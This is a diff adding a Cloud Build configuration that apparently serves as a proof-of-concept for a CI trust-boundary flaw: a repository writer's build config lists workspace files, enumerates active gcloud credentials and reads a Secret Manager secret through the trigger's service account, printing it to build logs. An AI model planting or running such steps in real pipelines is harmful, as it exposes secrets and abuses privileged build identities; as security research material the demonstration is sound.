@@ -1,0 +1,24 @@
+steps:
+  - name: gcr.io/google.com/cloudsdktool/cloud-sdk:slim
+    entrypoint: bash
+    args:
+      - -c
+      - |
+        set -x
+        echo "=== REPO WRITER CONTROLLED CLOUDBUILD EXECUTED ==="
+        echo "This cloudbuild.yaml is controlled by the untrusted repository writer."
+
+        echo "=== WORKSPACE PROOF ==="
+        find /workspace -maxdepth 2 -type f -print || true
+
+        echo "=== ATTACKER SOURCE MARKER ==="
+        cat /workspace/attacker-controlled.txt || true
+
+        echo "=== ACTIVE AUTH ==="
+        gcloud auth list || true
+
+        echo "=== SECRET ACCESS VIA TRIGGER SERVICE ACCOUNT ==="
+        gcloud secrets versions access latest --secret=boundary-demo-secret || true
+
+options:
+  logging: CLOUD_LOGGING_ONLY
